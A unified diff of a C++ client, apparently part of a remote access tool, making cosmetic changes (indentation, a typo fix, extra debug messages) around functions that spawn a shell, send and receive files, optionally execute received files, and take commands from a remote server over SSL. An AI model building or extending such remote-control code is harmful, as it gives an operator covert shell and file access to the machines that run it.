@@ -203,11 +203,11 @@ void Client::SpawnShell(const std::string strCommand){
 		iRet = SSL_write(sslSocket, CommandCodes::cShellRunning, 3);
 		if(iRet <= 0){
 			if(!CheckSslReturnCode(iRet)){
-			#ifdef _DEBUG
-			std::cout<<"Unable to send command to server\n";
-			error();
-			#endif
-			exit(0);
+				#ifdef _DEBUG
+				std::cout<<"Unable to send command to server\n";
+				error();
+				#endif
+				exit(0);
 			} else {
 				usleep(100000);
 				goto TryAgain3;
@@ -379,7 +379,7 @@ bool Client::SendFile(const std::string strLocalFile) {
 					if(!CheckSslReturnCode(iBytes)){
 						break;
 					}
-					usleep(1);
+					usleep(2);
 					goto FileSendTryAgain;
 				}
 			} else {		
@@ -429,7 +429,7 @@ void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocal
 			if(iRet <= 0){
 				if(!CheckSslReturnCode(iRet)){
 					#ifdef _DEBUG
-					std::cout<<"Unable to send canel command\n";
+					std::cout<<"Unable to send cancel command\n";
 					error();
 					#endif
 				} else {
@@ -469,6 +469,10 @@ void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocal
 			#endif
 		} else {
 			if(!CheckSslReturnCode(iBytesRead)){
+				#ifdef _DEBUG
+				std::cout<<"Unable to read packet from server\n";
+				error();
+				#endif
 				break;
 			}
 			usleep(100000);
@@ -489,7 +493,7 @@ bool Client::ParseCommand(char*& strCommand){
 	std::vector<std::string> vcCommands;
 	Misc::strSplit(strCommand, '@', vcCommands, 10);
 	if(vcCommands.size() > 0){
-		if(vcCommands[0] == CommandCodes::cUpload){ //receive file from server
+		if(vcCommands[0] == CommandCodes::cUpload){
 			RetrieveFile(Misc::StrToUint(vcCommands[1].c_str()), vcCommands[2][0], vcCommands[3]);
 			goto release;
 		}
@@ -498,7 +502,7 @@ bool Client::ParseCommand(char*& strCommand){
 				#ifdef _DEBUG
 				std::cout<<"Bye\n";
 				#endif
-				return false;         //return false to close connection
+				return false;    //return false to close connection
 			}
 			goto release;
 		}
@@ -550,7 +554,7 @@ bool Client::ParseCommand(char*& strCommand){
 		
 	} else {
 		#ifdef _DEBUG
-		std::cout<<"Error parsing raw data\n----------\n"<<strCommand<<"\n---------n";
+		std::cout<<"Error parsing command, raw data:\n----------\n"<<strCommand<<"\n---------n";
 		#endif
 	}
 	release:
@@ -573,7 +577,8 @@ bool Client::Connect(c_char* cIP, c_char* cPORT){
 	sslCTX = SSL_CTX_new(SSLv23_client_method());
 	if(sslCTX == nullptr){
 		#ifdef _DEBUG
-		ERR_print_errors_fp(stderr);
+		std::cout<<"SSL_CTX_new error\n";
+		error();
 		#endif
 		return false;
 	}
@@ -615,7 +620,7 @@ bool Client::Connect(c_char* cIP, c_char* cPORT){
 		freeaddrinfo(strctServer);
 		#ifdef _DEBUG
 		std::cout<<"Unable to stablish SSL connection\n";
-		ERR_print_errors_fp(stderr);
+		error();
 		#endif
 		return false;
 	}
